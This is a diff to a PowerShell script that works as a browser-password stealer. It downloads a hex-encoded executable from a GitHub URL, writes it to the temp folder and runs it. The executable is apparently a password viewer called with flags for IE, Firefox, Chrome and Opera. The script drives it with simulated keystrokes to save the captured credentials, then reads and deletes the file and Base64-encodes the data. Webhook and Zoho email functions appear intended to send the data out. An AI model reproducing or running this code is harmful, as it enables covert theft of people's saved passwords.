@@ -2,6 +2,26 @@ $global:isEmailSent = $false
 function SetEmailSentTrue {$global:isEmailSent = $true}
 function SetEmailSentFalse {$global:isEmailSent = $false}
 
+function Send-EmailNotification {
+    param (
+        [string]$ToEmail,
+        [string]$WebhookUrl,
+        [string]$Message
+    )
+
+    # Create the payload
+    $payload = @{
+        content = $Message
+    } | ConvertTo-Json
+
+    # Send the webhook notification
+    try {
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
+        Write-Host "Webhook notification sent successfully."
+    } catch {
+        Write-Host "Error sending webhook notification: $_"
+    }
+}
 
 function Send-ZohoEmail {
     param (
@@ -62,26 +82,62 @@ function Send-ZohoEmail {
 }
 
 # 1. Define the executable path
-$exe = "$env:TEMP\example.exe"
+# $exe = "$env:TEMP\example.exe"
 
 # 2. Run the tool with full browser flags
 # We use /stext "" to try and force output to the console, 
 # but if that build is restricted, we use a temporary variable file.
-$tempFile = "$env:TEMP\tmp.txt"
+# $tempFile = "$env:TEMP\tmp.txt"
 
 # Execute with all browsers enabled (1 = Yes)
-& $exe /LoadPasswordsIE 1 /LoadPasswordsFirefox 1 /LoadPasswordsChrome 1 /LoadPasswordsOpera 1 /stext $tempFile
+# & $exe /LoadPasswordsIE 1 /LoadPasswordsFirefox 1 /LoadPasswordsChrome 1 /LoadPasswordsOpera 1 /stext $tempFile
 
 # 3. Read the file into RAM and IMMEDIATELY delete the file
+
+
+# Run WBPV 
+        $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
+        $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
+        Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file
+
+        # OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY
+        $hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
+        $hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file
+
+        # Convert the hex string to a byte array
+        $bytes = [byte[]]::new($hexString.Length / 2)
+        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
+            $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
+        }
+
+        # Create a temporary file to hold the executable
+        $tempExePath = Join-Path $env:TEMP "example.exe"
+        [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
+        $process = Start-Process $tempExePath # Start the executable
+
+        #  SAVED DATA 
+        $tempFile = "$env:TEMP\data.txt"
+        Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
+        Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys
+
+        # Simulate CTRL+A and then CTRL+S to save the file
+        [System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
+        Start-Sleep -Milliseconds 500  # Wait a moment for selection
+        [System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
+        Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear
+
+        # Send the output file path and Enter
+        [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
+        Start-Sleep -Milliseconds 500  # Wait for the input
+        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save
+
+        Start-Sleep -Seconds 2 # Wait a moment for the file to save
+        Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
+
 if (Test-Path $tempFile) {
     $rawData = Get-Content $tempFile | Out-String
     Remove-Item $tempFile -Force
 }
-
-# # 1. Capture NirSoft output directly into RAM (Standard Output)
-# # No file is created on the hard drive
-# # Use the environment variable to point to the Temp folder
-# $rawData = & "$env:TEMP\example.exe" /sstdout | Out-String
 
 # 4. Obfuscate the data using Base64
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
